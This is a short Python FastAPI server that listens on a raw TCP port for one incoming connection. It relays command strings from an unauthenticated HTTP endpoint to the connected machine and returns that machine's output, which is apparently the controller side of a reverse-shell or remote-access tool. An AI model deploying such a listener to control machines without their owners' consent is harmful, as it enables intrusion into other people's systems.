from fastapi import FastAPI
from fastapi.responses import RedirectResponse
import uvicorn
import socket

app = FastAPI()

conn = None

async def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    local_pc = ""
    port = 12345
    s.bind((local_pc, port))
    s.listen()
    print("Waiting for connection...")
    global conn
    conn, address = s.accept()
    print("Connection from: " + str(address))
    return address


async def get_command(command: str):
    # conn, address = s.accept()
    # print("Connection from: " + str(address))
    try:
        conn.sendall(command.encode())
        packet = conn.recv(100000)
        decoded = packet.decode()
        # print(decoded)
        return decoded
    except:
        print("Connection closed")
        conn.close()
        return "Connection closed"

@app.get("/")
async def read_root():
    address = await connect()
    return "connecting"

@app.get("/command/{command}")
async def getCommand(command: str):
    result = await get_command(command)
    print(result)
    return result

if __name__ == '__main__':
    uvicorn.run("server_app:app")